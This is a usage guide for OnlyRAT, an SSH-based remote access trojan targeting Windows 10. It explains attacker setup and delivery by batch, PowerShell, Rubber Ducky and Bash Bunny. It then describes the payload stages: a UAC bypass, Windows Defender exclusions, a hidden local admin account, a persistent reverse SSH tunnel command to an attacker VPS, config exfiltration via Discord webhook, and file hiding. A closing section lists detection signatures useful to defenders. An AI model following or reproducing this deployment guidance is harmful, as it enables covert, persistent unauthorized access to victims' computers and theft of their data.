# MK01-OnlyRAT — Comprehensive Usage Guide

> **Repository**: https://github.com/CosmodiumCS/MK01-OnlyRAT  
> **Version**: 3.2  
> **Author**: Blue Cosmo (C0SM0)  
> **Type**: SSH-based Remote Access Tool (RAT)

---

## 1. Overview

OnlyRAT (Only Remote Access Tool) is an SSH-based RAT that operates almost entirely over the network, making it virtually fileless on the attacker machine. It uses OpenSSH for command-and-control, SCP for file transfer, and SSH reverse tunnelling for remote access. It is designed to target **Windows 10 Home** machines and installed via:

- Batch scripts (`.cmd`)
- PowerShell payloads (`.ps1`)
- Hak5 USB Rubber Ducky (`.txt`)
- Hak5 Bash Bunny (`.txt` + `payload.txt`)

---

## 2. Architecture

### 2.1 Attacker Components

| Component | Path | Purpose |
|---|---|---|
| `main.py` | `~/.MK01-OnlyRAT/main.py` | CLI controller — connects, uploads, downloads, runs commands |
| `install.sh` | — | Installs dependencies + registers `onlyrat` command to `/usr/local/bin` |
| `key` / `key.pub` | `~/.MK01-OnlyRAT/` | SSH key pair for VPS-based deployments |
| `payloads/` | `~/.MK01-OnlyRAT/payloads/` | Payload scripts sent to target |
| `installers/` | `~/.MK01-OnlyRAT/installers/` | Deployment vectors |

### 2.2 Target Components

| File | Purpose |
|---|---|
| `*.rat` config file | 7-line config: local IP, password, working dir, startup dir, remote host, remote port, connection type |
| `g1.cmd` / `v1.cmd` | Stage-1: requests admin elevation, downloads stage-2 |
| `g2.ps1` / `v2.ps1` | Stage-2: creates `onlyrat` admin user, installs SSH, creates reverse tunnel, sends `.rat` via Discord webhook (GitHub) or SCP (VPS) |
| `fix-orconsole.sh` | Re-adds target to known_hosts when SSH connection fails |

### 2.3 Connection Types

- **Local**: Direct SSH to the target's LAN IP (`ssh onlyrat@<lan_ip>`)
- **Remote**: SSH reverse tunnel via VPS (`ssh -R <vps_port>:localhost:22 onlyrat@<vps>`)

---

## 3. Attacker Setup

### 3.1 Prerequisites

- Debian-based Linux (Kali, Parrot)
- `python3`, `sshpass`, `ssh-keygen`, `ssh-copy-id`
- For VPS: a publicly accessible Linux server with OpenSSH

### 3.2 Installation

```bash
git clone https://github.com/CosmodiumCS/MK01-OnlyRAT.git
cd MK01-OnlyRAT
bash install.sh
```

This will:
1. Move all files to `~/.MK01-OnlyRAT`
2. Install `sshpass` and `python3`
3. Create `/usr/local/bin/onlyrat` — a wrapper that calls `main.py`

### 3.3 VPS Setup (for Remote Access)

```bash
onlyrat --setup
```

Interactive prompts will:
1. Ask for VPS user, IP, and port
2. Generate SSH keypair
3. Copy public key to VPS
4. Instruct you to edit `/etc/ssh/sshd_config` on VPS:
   ```
   AllowTcpForwarding yes
   GatewayPorts yes
   ```
5. Restart SSH: `sudo service ssh restart`
6. Upload the key and RAT payloads to the VPS web root

---

## 4. Deployment Vectors

### 4.1 GitHub Installer (Local Only)

**File**: `installers/from-github.cmd`

**Setup**:
1. Replace `DISCORDWEBHOOK` on line 5 with a Discord webhook URL
2. The config `.rat` file will be sent to the Discord channel

**Flow**:
```
from-github.cmd → downloads g1.cmd → elevates UAC → downloads g2.ps1 → creates user → installs SSH → sends .rat via webhook
```

### 4.2 VPS Installer (Remote Access)

**File**: `installers/from-vps.cmd`

**Setup**:
1. Replace `X.X.X.X` on line 2 with VPS IP
2. Config is sent via SCP to the VPS

**Flow**:
```
from-vps.cmd → downloads v1.cmd → elevates UAC → downloads v2.ps1 → creates user → installs SSH → sets up reverse tunnel → SCPs .rat to VPS
```

### 4.3 USB Rubber Ducky

| Variant | File |
|---|---|
| GitHub | `installers/onlyduck-github.txt` |
| VPS | `installers/onlyduck-vps.txt` |

Replace `DISCORDWEBHOOK` or `X.X.X.X` as appropriate, then encode and deploy.

### 4.4 Bash Bunny

| Variant | Files |
|---|---|
| GitHub | `installers/OnlyBUGS-github/payload.txt` + `duckyscript.txt` |
| VPS | `installers/OnlyBUGS-vps/payload.txt` + `duckyscript.txt` |

Same configuration pattern. Place in appropriate switch directory on the Bunny.

---

## 5. Obtaining the Config File

After the target runs the installer, the `.rat` config file is sent back:

- **GitHub deployment**: Via Discord webhook — download from the channel
- **VPS deployment**: Downloaded to attacker with:
  ```bash
  onlyrat -d
  # or
  onlyrat --dfig
  ```
  Then enter VPS user, IP, and port.

---

## 6. Attacker CLI Reference

### 6.1 Global Arguments

```bash
onlyrat                         # Show help menu
onlyrat -h / --help             # Help
onlyrat <user>.rat              # Connect to target using config file
onlyrat -d / --dfig             # Download config from VPS
onlyrat -s / --setup            # Setup VPS
onlyrat -m / --man / --manual   # Open manual (GitHub URL)
onlyrat -v / --version          # Show version
onlyrat -u / --update           # Check for updates
onlyrat -r / --remove           # Uninstall OnlyRAT from attacker
```

### 6.2 Interactive Commands (within a session)

#### Command & Control

| Command | Function |
|---|---|
| `init` | Initialize/reinitialize connection |
| `orconsole` | Open an interactive SSH shell |
| `fix orconsole` | Fix SSH known_hosts and reconnect |
| `upload` | Upload file to target via SCP |
| `download` / `exfiltrate` | Download file from target to `~/Downloads` |
| `set connection local` | Switch to local LAN connection |
| `set connection remote` | Switch to VPS-routed connection |
| `restart` | Remote restart target |
| `shutdown` | Remote shutdown target |
| `killswitch` | Remove OnlyRAT from target |

#### Options

| Command | Function |
|---|---|
| `help` | Show options menu |
| `man` / `manual` | Open online manual |
| `config` | Display current `.rat` config |
| `version` | Show version number |
| `update` | Update OnlyRAT |
| `uninstall` / `remove` | Remove OnlyRAT from attacker |
| `quit` / `exit` | Exit |

**Any other command** typed is executed directly on the attacker's shell via `os.system()`, which is both a feature and a security risk (see §8).

---

## 7. .rat Config File Format

```
<Local IP Address>
<Password for onlyrat user>
<Working Directory (Temp)>
<Startup Directory>
<Remote Host (VPS IP)>
<Remote Port>
<Connection Type: local | remote>
```

Example:
```
192.168.0.12
aBcDe
C:\Users\onlyrat\AppData\Local\Temp
C:\Users\onlyrat\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
203.0.113.5
2583
remote
```

---

## 8. Payload Details

### 8.1 Stage 1 — UAC Elevation (`.cmd`)

- `g1.cmd` / `v1.cmd` / `1.cmd`
- Checks admin via `cacls.exe`
- If not admin, spawns `getadmin.vbs` via `Shell.Application` UAC bypass
- Downloads stage-2 PowerShell payload
- Adds Windows Defender exclusion paths for `Startup` and `Temp`

### 8.2 Stage 2 — Persistence & SSH (`.ps1`)

- `g2.ps1` / `v2.ps1` / `2.ps1`

**Actions**:
1. **User Creation**: Creates local admin user `onlyrat` with random 5-char password
2. **Registry Hiding**: Sets `HKLM\...\Winlogon\SpecialAccounts\UserList\onlyrat = 0` to hide from login screen
3. **SSH Server Installation**: Installs `OpenSSH.Server` capability, starts service, sets to auto-start
4. **Reverse Tunnel**: Creates startup `.cmd` that runs:
   ```
   ssh -o ServerAliveInterval=30 -o StrictHostKeyChecking=no -R <port>:localhost:22 user@vps -i %temp%\key
   ```
5. **Config Exfiltration**: Sends `.rat` file via Discord webhook (GitHub) or SCP (VPS)
6. **File Obfuscation**: `attrib +h +s +r` on user directory, self-deletes installer scripts

### 8.3 Killswitch

```powershell
powershell /c Remove-Item <working>/* -r -Force;
Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;
Remove-Item "C:/Users/onlyrat" -r -Force;
Remove-LocalUser -Name "onlyrat";
shutdown /r
```

---

## 9. Operational Security (OPSEC) Considerations

### 9.1 Weaknesses of OnlyRAT

1. **Password in plaintext**: The `.rat` file and SSH commands contain the password in plaintext
2. **sshpass exposes password**: Every connection passes password via CLI, visible in process lists
3. **No encryption at rest**: Config files stored unencrypted on disk
4. **Static SSH key**: The repo ships with a working SSH private key (`key`) — anyone can use it
5. **Hardcoded IPs**: `1.cmd` and `2.ps1` contain a real VPS IP (`45.61.56.252`) — an OPSEC leak from the developer
6. **Command injection**: `main.py` uses `os.system(option)` — any command the user types is shell-executed, including malicious ones
7. **Discord webhook in plaintext**: Webhook URL stored in a file on target system (forensics artifact)
8. **Obvious process names**: `sshpass`, `ssh`, `powershell.exe` with visible arguments

### 9.2 Detection Signatures

| Signature | IOC |
|---|---|
| Process: `sshpass -p <password> ssh onlyrat@<ip>` | Network monitoring |
| File: `C:\Users\onlyrat\*.rat` | Disk forensics |
| Registry: `UserList\onlyrat = 0` | Registry forensics |
| User: `onlyrat` in Administrators group | User enumeration |
| Service: OpenSSH SSH Server | Service enumeration |
| Network: SSH reverse tunnel to VPS | Netflow analysis |

---

## 10. Contraindications

- OnlyRAT is **loud** — no AV evasion beyond Defender exclusions
- No encryption or obfuscation of payloads over HTTP
- The `os.system(option)` backdoor in `main.py` means an accidental keystroke can run arbitrary shell commands
- `sshpass` is detected by most EDR solutions
- Not suitable for targets with application whitelisting or network segmentation
